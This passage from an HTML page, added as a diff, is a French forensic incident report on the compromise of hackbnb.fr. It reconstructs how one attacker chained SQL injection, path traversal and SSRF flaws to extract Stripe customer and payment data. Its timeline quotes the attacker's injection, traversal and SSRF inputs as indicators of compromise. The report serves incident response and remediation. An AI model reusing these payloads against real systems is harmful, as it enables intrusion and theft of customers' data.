@@ -1,0 +1,2410 @@
+<!doctype html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<title>HackBNB — Synthèse technique de l'investigation forensic</title>
+<style>
+:root {
+  --fg: #1c2430;
+  --muted: #5b6673;
+  --accent: #0f5132;
+  --accent-light: #e8f3ee;
+  --border: #d8dee5;
+  --critique: #b42318;
+  --majeur: #b54708;
+  --mineur: #3f621a;
+  --code-bg: #f4f6f8;
+}
+* { box-sizing: border-box; }
+body {
+  font-family: "Segoe UI", "Helvetica Neue", Arial, sans-serif;
+  color: var(--fg);
+  line-height: 1.55;
+  font-size: 15px;
+  max-width: 880px;
+  margin: 0 auto;
+  padding: 48px 40px 80px;
+  background: #fff;
+}
+h1 {
+  font-size: 26px;
+  border-bottom: 3px solid var(--accent);
+  padding-bottom: 10px;
+  margin-top: 0;
+}
+h2 {
+  font-size: 20px;
+  color: var(--accent);
+  margin-top: 2.6em;
+  padding-top: 0.4em;
+  border-top: 1px solid var(--border);
+  page-break-before: auto;
+  break-after: avoid;
+}
+h3 {
+  font-size: 16.5px;
+  margin-top: 2em;
+  color: #16324a;
+  break-after: avoid;
+}
+h4 {
+  font-size: 14px;
+  color: var(--muted);
+  text-transform: uppercase;
+  letter-spacing: 0.04em;
+  margin-top: 1.4em;
+  break-after: avoid;
+}
+p, ul, ol { margin: 0.7em 0; }
+ul, ol { padding-left: 1.4em; }
+li { margin: 0.25em 0; }
+strong { color: #111; }
+a { color: var(--accent); text-decoration: none; }
+a:hover { text-decoration: underline; }
+hr {
+  border: none;
+  border-top: 1px solid var(--border);
+  margin: 2.2em 0;
+}
+code {
+  font-family: "SF Mono", Consolas, "Courier New", monospace;
+  background: var(--code-bg);
+  padding: 0.12em 0.4em;
+  border-radius: 4px;
+  font-size: 0.88em;
+  color: #9a3412;
+}
+.codeblock {
+  margin: 1em 0;
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  overflow: hidden;
+  break-inside: avoid;
+}
+.code-lang {
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+  color: var(--muted);
+  background: var(--code-bg);
+  padding: 4px 12px;
+  border-bottom: 1px solid var(--border);
+}
+.codeblock pre {
+  margin: 0;
+  padding: 14px 16px;
+  font-size: 13px;
+  line-height: 1.5;
+  white-space: pre-wrap;
+  overflow-wrap: anywhere;
+  word-break: break-word;
+}
+.codeblock code { background: none; padding: 0; color: inherit; }
+.table-wrap {
+  overflow-x: auto;
+  margin: 1.2em 0;
+}
+table {
+  border-collapse: collapse;
+  width: 100%;
+  font-size: 13.6px;
+}
+th, td {
+  border: 1px solid var(--border);
+  padding: 7px 11px;
+  vertical-align: top;
+  text-align: left;
+}
+th {
+  background: var(--accent-light);
+  color: var(--accent);
+  font-weight: 600;
+}
+tr:nth-child(even) td { background: #fafbfc; }
+img {
+  max-width: 100%;
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  display: block;
+  margin: 0.6em auto;
+}
+em { color: var(--muted); }
+.table-wrap table :is(td, th):has(> em:only-child) { color: var(--muted); }
+
+@media print {
+  body { padding: 0 8mm; font-size: 12.5px; max-width: none; }
+  h2 { page-break-before: always; border-top: none; margin-top: 0; }
+  h1 ~ h2:first-of-type { page-break-before: avoid; }
+  a { color: var(--fg); }
+  /* Avoid breaking inside a single row/code block/image, but let big
+     multi-row tables (chronologie, logs) flow across pages row by row —
+     forcing the whole table to stay together just pushes the cut into
+     the middle of a row (often an image) once it's taller than a page. */
+  tr, .codeblock, img { break-inside: avoid; }
+  img { max-height: 240mm; }
+  @page { margin: 16mm 14mm; }
+}
+pre { line-height: 125%; }
+td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+.hl .hll { background-color: #ffffcc }
+.hl { background: #f8f8f8; }
+.hl .c { color: #3D7B7B; font-style: italic } /* Comment */
+.hl .err { border: 1px solid #FF0000 } /* Error */
+.hl .k { color: #008000; font-weight: bold } /* Keyword */
+.hl .o { color: #666666 } /* Operator */
+.hl .ch { color: #3D7B7B; font-style: italic } /* Comment.Hashbang */
+.hl .cm { color: #3D7B7B; font-style: italic } /* Comment.Multiline */
+.hl .cp { color: #9C6500 } /* Comment.Preproc */
+.hl .cpf { color: #3D7B7B; font-style: italic } /* Comment.PreprocFile */
+.hl .c1 { color: #3D7B7B; font-style: italic } /* Comment.Single */
+.hl .cs { color: #3D7B7B; font-style: italic } /* Comment.Special */
+.hl .gd { color: #A00000 } /* Generic.Deleted */
+.hl .ge { font-style: italic } /* Generic.Emph */
+.hl .ges { font-weight: bold; font-style: italic } /* Generic.EmphStrong */
+.hl .gr { color: #E40000 } /* Generic.Error */
+.hl .gh { color: #000080; font-weight: bold } /* Generic.Heading */
+.hl .gi { color: #008400 } /* Generic.Inserted */
+.hl .go { color: #717171 } /* Generic.Output */
+.hl .gp { color: #000080; font-weight: bold } /* Generic.Prompt */
+.hl .gs { font-weight: bold } /* Generic.Strong */
+.hl .gu { color: #800080; font-weight: bold } /* Generic.Subheading */
+.hl .gt { color: #0044DD } /* Generic.Traceback */
+.hl .kc { color: #008000; font-weight: bold } /* Keyword.Constant */
+.hl .kd { color: #008000; font-weight: bold } /* Keyword.Declaration */
+.hl .kn { color: #008000; font-weight: bold } /* Keyword.Namespace */
+.hl .kp { color: #008000 } /* Keyword.Pseudo */
+.hl .kr { color: #008000; font-weight: bold } /* Keyword.Reserved */
+.hl .kt { color: #B00040 } /* Keyword.Type */
+.hl .m { color: #666666 } /* Literal.Number */
+.hl .s { color: #BA2121 } /* Literal.String */
+.hl .na { color: #687822 } /* Name.Attribute */
+.hl .nb { color: #008000 } /* Name.Builtin */
+.hl .nc { color: #0000FF; font-weight: bold } /* Name.Class */
+.hl .no { color: #880000 } /* Name.Constant */
+.hl .nd { color: #AA22FF } /* Name.Decorator */
+.hl .ni { color: #717171; font-weight: bold } /* Name.Entity */
+.hl .ne { color: #CB3F38; font-weight: bold } /* Name.Exception */
+.hl .nf { color: #0000FF } /* Name.Function */
+.hl .nl { color: #767600 } /* Name.Label */
+.hl .nn { color: #0000FF; font-weight: bold } /* Name.Namespace */
+.hl .nt { color: #008000; font-weight: bold } /* Name.Tag */
+.hl .nv { color: #19177C } /* Name.Variable */
+.hl .ow { color: #AA22FF; font-weight: bold } /* Operator.Word */
+.hl .w { color: #bbbbbb } /* Text.Whitespace */
+.hl .mb { color: #666666 } /* Literal.Number.Bin */
+.hl .mf { color: #666666 } /* Literal.Number.Float */
+.hl .mh { color: #666666 } /* Literal.Number.Hex */
+.hl .mi { color: #666666 } /* Literal.Number.Integer */
+.hl .mo { color: #666666 } /* Literal.Number.Oct */
+.hl .sa { color: #BA2121 } /* Literal.String.Affix */
+.hl .sb { color: #BA2121 } /* Literal.String.Backtick */
+.hl .sc { color: #BA2121 } /* Literal.String.Char */
+.hl .dl { color: #BA2121 } /* Literal.String.Delimiter */
+.hl .sd { color: #BA2121; font-style: italic } /* Literal.String.Doc */
+.hl .s2 { color: #BA2121 } /* Literal.String.Double */
+.hl .se { color: #AA5D1F; font-weight: bold } /* Literal.String.Escape */
+.hl .sh { color: #BA2121 } /* Literal.String.Heredoc */
+.hl .si { color: #A45A77; font-weight: bold } /* Literal.String.Interpol */
+.hl .sx { color: #008000 } /* Literal.String.Other */
+.hl .sr { color: #A45A77 } /* Literal.String.Regex */
+.hl .s1 { color: #BA2121 } /* Literal.String.Single */
+.hl .ss { color: #19177C } /* Literal.String.Symbol */
+.hl .bp { color: #008000 } /* Name.Builtin.Pseudo */
+.hl .fm { color: #0000FF } /* Name.Function.Magic */
+.hl .vc { color: #19177C } /* Name.Variable.Class */
+.hl .vg { color: #19177C } /* Name.Variable.Global */
+.hl .vi { color: #19177C } /* Name.Variable.Instance */
+.hl .vm { color: #19177C } /* Name.Variable.Magic */
+.hl .il { color: #666666 } /* Literal.Number.Integer.Long */
+</style>
+</head>
+<body>
+<h1 id="hackbnb-synthèse-technique-de-linvestigation-forensic">HackBNB : Synthèse technique de l'investigation forensic</h1>
+<h2 id="propriétés-du-document">Propriétés du document</h2>
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Champ</th>
+<th>Valeur</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>Titre</strong></td>
+<td>Synthèse technique de l'investigation forensic de hackbnb.fr</td>
+</tr>
+<tr>
+<td><strong>Client</strong></td>
+<td>HackBNB (Élodie Marchand, CEO ; Karim Lefèvre, responsable technique)</td>
+</tr>
+<tr>
+<td><strong>Destinataires</strong></td>
+<td>Équipe de développement de la plateforme hackbnb.fr</td>
+</tr>
+<tr>
+<td><strong>Auteurs</strong></td>
+<td>Bastien DESPREZ, Arnaud DECOURT, Théo DEMARIA, Aiman MANCHOUT</td>
+</tr>
+<tr>
+<td><strong>Date</strong></td>
+<td>13 novembre 2026</td>
+</tr>
+<tr>
+<td><strong>Classification</strong></td>
+<td><strong>Confidentiel</strong> : diffusion restreinte aux personnes chargées de corriger les vulnérabilités. Les secrets cités sont volontairement tronqués.</td>
+</tr>
+</tbody></table></div>
+
+<h2 id="table-des-matières">Table des matières</h2>
+<ol>
+
+<li>
+
+
+<a href="#1-r%C3%A9sum%C3%A9-ex%C3%A9cutif">Résumé exécutif</a>
+
+</li>
+
+<li>
+
+
+<a href="#2-p%C3%A9rim%C3%A8tre-objectifs-et-hypoth%C3%A8ses">Périmètre, objectifs et hypothèses</a>
+
+</li>
+
+<li>
+
+
+<a href="#3-m%C3%A9thodologie">Méthodologie</a>
+
+</li>
+
+<li>
+
+
+<a href="#4-synth%C3%A8se-des-r%C3%A9sultats">Synthèse des résultats</a>
+
+</li>
+
+<li>
+
+
+<a href="#5-investigation-forensic-des-logs-apache">Investigation forensic des logs Apache</a>
+
+</li>
+
+<li>
+
+
+<a href="#6-d%C3%A9tail-des-vuln%C3%A9rabilit%C3%A9s">Détail des vulnérabilités</a>
+
+</li>
+
+<li>
+
+
+<a href="#7-recommandations-prioris%C3%A9es">Recommandations priorisées</a>
+
+</li>
+
+<li>
+
+
+<a href="#8-r%C3%A9f%C3%A9rences">Références</a>
+
+</li>
+
+<li>
+
+
+<a href="#9-glossaire">Glossaire</a>
+
+</li>
+
+<li>
+
+
+<a href="#10-annexes">Annexes</a>
+
+</li>
+
+</ol>
+
+<hr />
+
+<h2 id="1-résumé-exécutif">1. Résumé exécutif</h2>
+<p>
+
+<strong>Pourquoi cette étude</strong> : HackBNB a mandaté le CERT le 9 novembre 2026 après la découverte d'une revendication de compromission et d'une mise en vente de ses données sur le darkweb, publiée avant toute réponse de l'entreprise (chronologie complète en §5.2, objectifs détaillés en §2). Il fallait établir si l'intrusion était réelle et, si oui, en mesurer l'ampleur pour protéger les clients concernés et respecter les obligations réglementaires de l'entreprise.
+</p>
+
+<p>
+
+<strong>La compromission de hackbnb.fr le 7 novembre 2026 est avérée.</strong> Les journaux Apache montrent qu'une seule adresse IP (<code>149.102.235.40</code>) a exploité <strong>cinq des huit vulnérabilités</strong> du rapport de test d'intrusion de juin 2026 (D1, D2, D3, D4, D8), restées non corrigées. L'attaque a duré <strong>42 minutes</strong>, de 10:52 à 11:34. Il s'est écoulé <strong>12 minutes</strong> entre la première injection SQL réussie et la fin de l'exfiltration.
+</p>
+
+<p>
+
+L'attaquant, qui signe <code>hackb3ck</code> / <code>Hackb3ck6000</code>, a détourné le compte Stripe marchand de HackBNB à travers l'application. Il a ainsi extrait <strong>la liste des clients Stripe et les moyens de paiement de 624 clients</strong> (marque de carte, 4 derniers chiffres, date d'expiration), le code source du back-end et un fichier système. Il a aussi confirmé sa propre réservation sans la payer. Il a contacté HackBNB le soir même en se présentant comme chasseur de primes, puis a mis les données en vente sur un forum du darkweb le 9 novembre à 06:37, sans attendre de réponse.
+</p>
+
+<p>
+
+Les huit vulnérabilités ont été localisées dans le code et sept ont été reproduites sur la pré-production. La huitième, D6, a été établie par audit du dépôt Git.
+</p>
+
+<p>
+
+<strong>Actions immédiates</strong> :
+</p>
+
+<ul>
+
+<li>
+
+
+révoquer les clés Stripe ;
+
+</li>
+
+<li>
+
+
+notifier la CNIL et les clients concernés ;
+
+</li>
+
+<li>
+
+
+appliquer les corrections de code fournies dans le GitHub.
+
+</li>
+
+</ul>
+
+<hr />
+
+<h2 id="2-périmètre-objectifs-et-hypothèses">2. Périmètre, objectifs et hypothèses</h2>
+<p>
+
+<strong>Objectifs</strong> (demande du client, annexes 1 et 3) :
+</p>
+
+<ol>
+
+<li>
+
+
+Déterminer si la plateforme a été compromise le 7 novembre 2026, preuves à l'appui (IoC).
+
+</li>
+
+<li>
+
+
+Si oui, établir la chronologie de l'attaque, le profil de l'attaquant et les données exfiltrées.
+
+</li>
+
+<li>
+
+
+Localiser dans le code les vulnérabilités du rapport de pentest (annexe 5), les reproduire et proposer leurs correctifs.
+
+</li>
+
+</ol>
+
+<p>
+
+<strong>Périmètre</strong> :
+</p>
+
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Élément</th>
+<th>Détail</th>
+</tr></thead><tbody>
+<tr>
+<td>Production (attaquée)</td>
+<td><code>https://hackbnb.fr</code> : hors ligne depuis le 9 novembre, non testée</td>
+</tr>
+<tr>
+<td>Pré-production (tests)</td>
+<td><code>https://hackbnb.dashbox.cloud</code>, déclarée identique à la production</td>
+</tr>
+<tr>
+<td>Code source</td>
+<td>Dépôt GitHub du projet, historique complet (31 commits)</td>
+</tr>
+<tr>
+<td>Journaux</td>
+<td><code>apache.log</code> du 7 novembre 2026 (13 925 requêtes)</td>
+</tr>
+<tr>
+<td>Annexes</td>
+<td>E-mails (annexes 1 et 2), entretien technique (annexe 3), post darkweb (annexe 4), rapport de pentest (annexe 5)</td>
+</tr>
+</tbody></table></div>
+
+<hr />
+
+<h2 id="3-méthodologie">3. Méthodologie</h2>
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Étape</th>
+<th>Travaux</th>
+<th>Outils</th>
+</tr></thead><tbody>
+<tr>
+<td>1. Cadrage</td>
+<td>Lecture des annexes, identification des comptes, IP et dates utiles</td>
+<td>Aucun</td>
+</tr>
+<tr>
+<td>2. Analyse des logs</td>
+<td>Import dans Loki, regroupement par IP et User-Agent, isolement des requêtes anormales (paramètres, codes 404/500, outils automatisés), corrélation avec les annexes 2 et 4</td>
+<td>Grafana, Loki, <code>grep</code> / <code>awk</code></td>
+</tr>
+<tr>
+<td>3. Revue de code</td>
+<td>Localisation de chaque défaut du rapport de pentest (fichier, ligne, cause racine)</td>
+<td>Lecture du code, <code>git log -S</code></td>
+</tr>
+<tr>
+<td>4. Recherche de secrets</td>
+<td>Scan de tout l'historique Git</td>
+<td>Gitleaks 8</td>
+</tr>
+<tr>
+<td>5. Exploitation</td>
+<td>Reproduction de chaque défaut sur la pré-production, captures requête / réponse</td>
+<td>Burp Suite Community (Repeater, Intruder), <code>curl</code></td>
+</tr>
+<tr>
+<td>6. Correction et re-test</td>
+<td>Application des correctifs, puis rejeu des requêtes de l'attaquant (section 6, « Correctif et re-test »)</td>
+<td>Burp Suite, <code>curl</code></td>
+</tr>
+</tbody></table></div>
+
+<p>
+
+<strong>Échelle de risque</strong> : celle du rapport de pentest, issue du référentiel PASSI de l'ANSSI. Le risque résulte du croisement de la difficulté d'exploitation et de l'impact :
+</p>
+
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Impact ↓ / Exploitation →</th>
+<th>Très difficile</th>
+<th>Difficile</th>
+<th>Modérée</th>
+<th>Facile</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>Mineur</strong></td>
+<td>Mineur</td>
+<td>Mineur</td>
+<td>Important</td>
+<td>Majeur</td>
+</tr>
+<tr>
+<td><strong>Important</strong></td>
+<td>Mineur</td>
+<td>Important</td>
+<td>Important</td>
+<td>Majeur</td>
+</tr>
+<tr>
+<td><strong>Majeur</strong></td>
+<td>Important</td>
+<td>Majeur</td>
+<td>Majeur</td>
+<td>Critique</td>
+</tr>
+<tr>
+<td><strong>Critique</strong></td>
+<td>Important</td>
+<td>Majeur</td>
+<td>Critique</td>
+<td>Critique</td>
+</tr>
+</tbody></table></div>
+
+<hr />
+
+<h2 id="4-synthèse-des-résultats">4. Synthèse des résultats</h2>
+<div class="table-wrap"><table>
+<thead><tr>
+<th>ID</th>
+<th>Vulnérabilité</th>
+<th>Exploitation</th>
+<th>Impact</th>
+<th>Risque</th>
+<th>Reproduite</th>
+<th>Exploitée le 7/11</th>
+<th>Correctif</th>
+</tr></thead><tbody>
+<tr>
+<td>D1</td>
+<td>Injection SQL sur <code>/api/rooms/</code></td>
+<td>Facile</td>
+<td>Critique</td>
+<td><strong>Critique</strong></td>
+<td>Oui</td>
+<td><strong>Oui</strong> (11:11, 11:16)</td>
+<td>À appliquer</td>
+</tr>
+<tr>
+<td>D2</td>
+<td>Path traversal sur <code>/api/uploads/</code></td>
+<td>Facile</td>
+<td>Critique</td>
+<td><strong>Critique</strong></td>
+<td>Oui</td>
+<td><strong>Oui</strong> (11:18–11:19)</td>
+<td>À appliquer</td>
+</tr>
+<tr>
+<td>D3</td>
+<td>SSRF vers l'API Stripe</td>
+<td>Modérée</td>
+<td>Critique</td>
+<td><strong>Critique</strong></td>
+<td>Oui</td>
+<td><strong>Oui</strong> (11:19–11:23)</td>
+<td>À appliquer</td>
+</tr>
+<tr>
+<td>D4</td>
+<td>Secret de confirmation prévisible</td>
+<td>Modérée</td>
+<td>Critique</td>
+<td><strong>Critique</strong></td>
+<td>Oui</td>
+<td><strong>Oui</strong> (11:16, secret lu via D1)</td>
+<td>À appliquer</td>
+</tr>
+<tr>
+<td>D5</td>
+<td>E-mail des hôtes exposé par l'API</td>
+<td>Facile</td>
+<td>Important</td>
+<td><strong>Majeur</strong></td>
+<td>Oui</td>
+<td>Exposé (non ciblé)</td>
+<td>À appliquer</td>
+</tr>
+<tr>
+<td>D6</td>
+<td>Clés Stripe dans le dépôt Git</td>
+<td>Difficile*</td>
+<td>Critique</td>
+<td><strong>Majeur</strong>*</td>
+<td>Oui (audit Git)</td>
+<td>Non observée</td>
+<td>À appliquer</td>
+</tr>
+<tr>
+<td>D7</td>
+<td>En-têtes de sécurité absents → XSS</td>
+<td>Difficile</td>
+<td>Majeur</td>
+<td><strong>Majeur</strong></td>
+<td>Oui (sans payload)</td>
+<td>Non observée</td>
+<td>À appliquer</td>
+</tr>
+<tr>
+<td>D8</td>
+<td>Bannières serveur et mode debug</td>
+<td>Très difficile</td>
+<td>Important</td>
+<td><strong>Mineur</strong></td>
+<td>Oui</td>
+<td><strong>Oui</strong> (11:18, tracebacks)</td>
+<td>À appliquer</td>
+</tr>
+</tbody></table></div>
+
+<p>
+
+* Évaluation de l'annexe 5. La clé <code>sk_test_…</code> étant encore dans le code actuel, nous réévaluons l'exploitation en <strong>Facile</strong>, soit un risque <strong>Critique</strong> (voir D6).
+</p>
+
+<p>
+
+<strong>Répartition</strong> (évaluation de l'annexe 5, toutes confirmées) : <strong>4 Critiques</strong>, <strong>3 Majeures</strong>, 0 Importante, <strong>1 Mineure</strong>.
+</p>
+
+<p>
+
+<strong>Constats principaux</strong> :
+</p>
+
+<ul>
+
+<li>
+
+
+Aucune des huit vulnérabilités remontées en juin 2026 n'a été corrigée. Les quatre critiques ont toutes servi à l'attaque.
+
+</li>
+
+<li>
+
+
+L'attaquant a enchaîné les failles : D1 lui a fourni le secret exploité par D4, D4 a rendu sa réservation « payée » (prérequis de D3), et D3 a servi à l'exfiltration. Corriger D3 seule aurait suffi à empêcher l'exfiltration des données de paiement. Corriger D1 seule l'aurait au moins retardée : il aurait alors fallu bruteforcer le secret (D4).
+
+</li>
+
+<li>
+
+
+Aucun mécanisme de détection n'a réagi à 6 783 requêtes venues d'une même IP en 42 minutes, ni aux User-Agents d'outils offensifs (<code>dirsearch</code>, <code>python-requests</code>).
+
+</li>
+
+</ul>
+
+<hr />
+
+<h2 id="5-investigation-forensic-des-logs-apache">5. Investigation forensic des logs Apache</h2>
+<p>
+
+Sur les 13 925 requêtes du 7 novembre 2026, l'IP <code>149.102.235.40</code> en génère à elle seule <strong>6 783 (48,7 %)</strong>, entre 10:52:23 et 11:34:54. Chacune des autres IP en émet au plus 19, toutes conformes au parcours d'un client (consultation des chambres, réservation, paiement). Hors de cette IP, le journal ne contient que 14 erreurs 404 isolées (références de réservation mal saisies).
+</p>
+
+<h3 id="51-profil-de-lattaquant">5.1 Profil de l'attaquant</h3>
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Élément</th>
+<th>Valeur</th>
+<th>Source</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>Pseudonymes</strong></td>
+<td><code>hackb3ck</code> (e-mail), <code>Hackb3ck6000</code> (forum)</td>
+<td>Annexes 2 et 4</td>
+</tr>
+<tr>
+<td><strong>Adresse e-mail</strong></td>
+<td><code>contact@hackb3ck.me</code></td>
+<td>Annexe 2</td>
+</tr>
+<tr>
+<td><strong>Adresse IP</strong></td>
+<td><code>149.102.235.40</code> (VPN Datacamp, sortie Prague), seule IP de l'attaque</td>
+<td><code>apache.log</code>, géolocalisation IP</td>
+</tr>
+<tr>
+<td><strong>Navigateur</strong></td>
+<td>Mozilla Firefox <strong>52.0</strong></td>
+<td>User-Agent <code>Gecko/20100101 Firefox/52.0</code></td>
+</tr>
+<tr>
+<td><strong>Système d'exploitation</strong></td>
+<td>macOS <strong>10.12.5</strong> (Sierra)</td>
+<td>User-Agent <code>Macintosh; Intel Mac OS X 10_12_5</code></td>
+</tr>
+<tr>
+<td><strong>Outils</strong></td>
+<td><code>dirsearch v0.4.2</code> (énumération de chemins), script Python <code>requests 2.25.0</code> (exfiltration)</td>
+<td>User-Agents</td>
+</tr>
+<tr>
+<td><strong>Compte forum</strong></td>
+<td>Inscrit le 02/07/2022, 37 messages, 19 réactions</td>
+<td>Annexe 4</td>
+</tr>
+</tbody></table></div>
+
+<p>
+
+<strong>Lien entre l'IP et le vendeur du forum</strong> : l'exemple de données publié (<code>cus_…</code>, nom, adresse, <code>visa</code>, <code>09</code>, <code>2026</code>, <code>4242</code>) contient exactement les champs que renvoient les endpoints Stripe <code>/v1/customers</code> et <code>/v1/customers/&lt;id&gt;/payment_methods</code>. Or ces deux endpoints ont été interrogés via la SSRF depuis <code>149.102.235.40</code>, et uniquement depuis cette IP.
+</p>
+
+<p>
+
+<strong>Comportement</strong> : méthodique (chaque faille est validée à la main avant d'être automatisée), compétences intermédiaires (chaînage de plusieurs failles, troncature d'URL par <code>#</code>, outils publics). Motivation financière avec double jeu : il réclame une prime de « bug bounty » le soir de l'attaque, puis vend les données 31 heures plus tard sans attendre de réponse.
+</p>
+
+<h3 id="52-chronologie">5.2 Chronologie</h3>
+<p>
+
+<img src="img/grafana_logs_surge.png" alt="Afflux massif de requêtes lors de l'attaque dans Grafana" />
+<em>Vue Grafana Logs Drilldown (heures UTC) : pic de plus de 6 300 requêtes entre 08:52 et 09:02 UTC, soit 10:52–11:02 dans le journal.</em>
+</p>
+
+<p>
+
+<img src="img/grafana_sqli_ssrf.png" alt="Détail des requêtes d'exploitation SQLi et SSRF" />
+<em>Vue Grafana Loki : requête UNION SELECT, puis appels SSRF vers Stripe.</em>
+</p>
+
+<p>
+
+<strong>Samedi 7 novembre 2026</strong> (heures du journal, <code>+0200</code>)
+</p>
+
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Heure</th>
+<th>Phase</th>
+<th>Événement</th>
+<th>IoC</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>10:52:23</strong></td>
+<td>Première connexion</td>
+<td>Page d'accueil, puis consultation manuelle de 10 annonces</td>
+<td><code>GET / 200</code>, UA Firefox 52 / macOS</td>
+</tr>
+<tr>
+<td>10:53:03 – 10:53:21</td>
+<td>Sondage manuel</td>
+<td>Valeurs limites et premiers tests d'injection, sans succès</td>
+<td><code>/api/rooms/-1</code>, <code>/api/rooms/toto</code>, <code>/api/rooms/'%20OR%201=1%20--</code> → <code>404</code></td>
+</tr>
+<tr>
+<td>10:53:21 – 11:00:02</td>
+<td>Scan automatisé</td>
+<td>Énumération de chemins sensibles (<code>/.git/HEAD</code>, <code>/admin/</code>, <code>/backup.sql</code>…) : 6 093 requêtes, toutes en 404</td>
+<td>UA <code>dirsearch/v0.4.2</code></td>
+</tr>
+<tr>
+<td><strong>11:11:37</strong></td>
+<td><strong>D1</strong></td>
+<td>Injection SQL réussie sur le filtre de catégorie</td>
+<td><code>/api/rooms/?category=hut'%20OR%201=1%20--</code> → <code>200</code></td>
+</tr>
+<tr>
+<td>11:13:37</td>
+<td>Préparation</td>
+<td>Création de la réservation <code>85A1NBEJ</code></td>
+<td><code>POST /api/bookings/ 200</code></td>
+</tr>
+<tr>
+<td>11:13:52 – 11:13:57</td>
+<td>Tentative D4</td>
+<td>Deux confirmations de paiement avec un secret deviné, refusées</td>
+<td><code>POST …/85A1NBEJ/confirm-checkout 422</code></td>
+</tr>
+<tr>
+<td><strong>11:16:44</strong></td>
+<td><strong>D1</strong></td>
+<td><code>UNION SELECT</code> sur <code>bookings</code>, filtré sur sa réservation : lecture de son <code>checkout_confirmation_secret</code></td>
+<td><code>…UNION SELECT bookings.id, bookings.reference, bookings.checkout_confirmation_secret, … FROM bookings WHERE bookings.reference = '85A1NBEJ' --</code> → <code>200</code></td>
+</tr>
+<tr>
+<td><strong>11:16:54</strong></td>
+<td><strong>D4</strong></td>
+<td>Réservation confirmée <strong>sans paiement</strong></td>
+<td><code>POST …/85A1NBEJ/confirm-checkout 200</code></td>
+</tr>
+<tr>
+<td>11:16:59</td>
+<td>Vérification</td>
+<td>Réservation désormais « payée », lignes de paiement consultées (prérequis de D3)</td>
+<td><code>GET …/checkout-lines?checkout_session_id=cs_test_… 200</code></td>
+</tr>
+<tr>
+<td><strong>11:18:49 – 11:18:54</strong></td>
+<td><strong>D8</strong></td>
+<td>Noms de fichiers invalides : pages d'erreur de 23 Ko (traceback Werkzeug en mode debug) révélant l'arborescence du back</td>
+<td><code>/api/uploads/?name=test.jpg</code>, <code>.env</code>, <code>/etc/passwd</code> → <code>500</code></td>
+</tr>
+<tr>
+<td><strong>11:18:56 – 11:19:10</strong></td>
+<td><strong>D2</strong></td>
+<td>Lecture de 4 fichiers du serveur</td>
+<td><code>?name=../app.py</code>, <code>../api/bookings/bookings_api.py</code>, <code>../services/stripe.py</code>, <code>../../etc/passwd</code> → <code>200</code></td>
+</tr>
+<tr>
+<td>11:19:35 – 11:19:38</td>
+<td>Sondage D3</td>
+<td>Tests du paramètre <code>checkout_session_id</code></td>
+<td><code>=test</code>, <code>=-1</code> → <code>404</code></td>
+</tr>
+<tr>
+<td><strong>11:19:43</strong></td>
+<td><strong>D3</strong></td>
+<td>SSRF vers <code>/v1/customers</code> : <strong>liste des clients Stripe</strong></td>
+<td><code>checkout_session_id=../../customers%23</code> → <code>200</code>, <strong>19 128 640 octets</strong></td>
+</tr>
+<tr>
+<td>11:20:03</td>
+<td>D3</td>
+<td>Moyens de paiement d'un premier client, à la main</td>
+<td><code>../../customers/cus_ScmrFdHx8iQd86/payment_methods%23</code> → <code>200</code></td>
+</tr>
+<tr>
+<td><strong>11:23:13 – 11:23:54</strong></td>
+<td><strong>D3, exfiltration automatisée</strong></td>
+<td>Moyens de paiement de 623 autres clients en 41 secondes</td>
+<td>UA <code>python-requests/2.25.0</code>, 623 × <code>…/payment_methods%23</code> → <code>200</code></td>
+</tr>
+<tr>
+<td><strong>11:34:54</strong></td>
+<td>Dernière connexion</td>
+<td>Navigation sur 3 annonces</td>
+<td><code>GET / 200</code>, UA Firefox 52</td>
+</tr>
+<tr>
+<td><strong>23:51</strong></td>
+<td>Prise de contact</td>
+<td>E-mail à <code>contact@hackbnb.fr</code> : se présente en <em>bug bounty hunter</em> et demande une récompense. Arrivé dans les spams.</td>
+<td>Annexe 2</td>
+</tr>
+</tbody></table></div>
+
+<p>
+
+<strong>Lundi 9 novembre 2026</strong>
+</p>
+
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Heure</th>
+<th>Événement</th>
+<th>Source</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>06:37</strong></td>
+<td><strong>Mise en vente des données</strong> sur un forum russophone : <em>« hackbnb.fr customers and payments leak »</em>, tags <code>stripe</code>, <code>sql base</code></td>
+<td>Annexe 4</td>
+</tr>
+<tr>
+<td>07:12</td>
+<td>HackBNB découvre l'e-mail et sollicite le CERT</td>
+<td>Annexe 1</td>
+</tr>
+<tr>
+<td>08:45</td>
+<td>Entretien avec le responsable technique, site mis hors ligne</td>
+<td>Annexe 3</td>
+</tr>
+<tr>
+<td>12:13</td>
+<td>Capture du post par l'équipe CTI</td>
+<td>Annexe 4</td>
+</tr>
+</tbody></table></div>
+
+<h3 id="53-données-exfiltrées">5.3 Données exfiltrées</h3>
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Donnée</th>
+<th>Certitude</th>
+<th>Preuve</th>
+</tr></thead><tbody>
+<tr>
+<td>Liste des clients Stripe (identifiants <code>cus_</code>, noms, adresses)</td>
+<td><strong>Certain</strong></td>
+<td>SSRF <code>../../customers%23</code> → <code>200</code>, 19,1 Mo (11:19:43). Champs identiques à l'exemple du forum.</td>
+</tr>
+<tr>
+<td>Moyens de paiement de <strong>624 clients</strong> (marque, 4 derniers chiffres, expiration)</td>
+<td><strong>Certain</strong></td>
+<td>624 identifiants <code>cus_</code> distincts interrogés sur <code>/payment_methods</code> → <code>200</code> (11:20:03 et 11:23:13–11:23:54)</td>
+</tr>
+<tr>
